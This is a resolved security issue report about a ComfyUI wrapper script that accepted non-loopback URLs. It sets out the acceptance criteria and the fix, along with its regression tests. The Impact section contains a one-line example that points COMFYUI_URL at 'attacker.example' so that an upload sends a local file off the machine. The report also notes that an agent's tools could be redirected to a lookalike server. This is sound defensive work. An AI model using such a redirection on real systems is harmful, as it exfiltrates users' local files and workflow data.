# Issue: comfyui wrapper accepts arbitrary --url / COMFYUI_URL (no loopback restriction)

- **Severity**: P2
- **Status**: resolved
- **File**: `extensions/comfyui-operator/wrapper.py`

## Evidence

`DEFAULT_URL = "http://127.0.0.1:8188"` but `--url` and env
`COMFYUI_URL` are used verbatim as request base (`main` ->
`cmd_*` -> `_request`). No host validation anywhere.

Compare `extensions/voicebox/wrapper.py`, whose stated contract is:

> Localhost-only: VB_HOST override must resolve to a loopback host.

`resolve_base_url()` there rejects non-loopback overrides. comfyui has
no equivalent guard.

## Impact

`COMFYUI_URL=http://attacker.example` + `upload <path>` POSTs an
arbitrary local file to a remote host (exfiltration). `submit` POSTs
workflow JSON (may embed local paths/prompts) anywhere. The agent's own
tool wiring could be redirected to a lookalike server that returns
crafted history entries -- which also feeds issue 02's path traversal.

## Acceptance

- `--url`/`COMFYUI_URL` must resolve to a loopback host
  (`127.0.0.1`, `::1`, `localhost`); non-loopback -> typed fail
  (same contract as voicebox `resolve_base_url`)
- http/https scheme only; reject others
- Regression tests: remote host rejected, loopback accepted,
  env-var override honored after validation

## Answer

Fixed. `main()` now validates `--url`/`COMFYUI_URL` before dispatch:
scheme must be http/https and hostname must be loopback
(`127.0.0.1`, `::1`, `localhost`) -- same contract as
`voicebox.wrapper.resolve_base_url`. Non-loopback or bad scheme ->
`_fail("...loopback host...")` exit 1 before any request is made, so
`upload`/`submit` can no longer POST local files or workflow JSON to a
remote host. Tests: remote `--url` rejected, remote `COMFYUI_URL`
rejected, `file://` scheme rejected, loopback accepted.
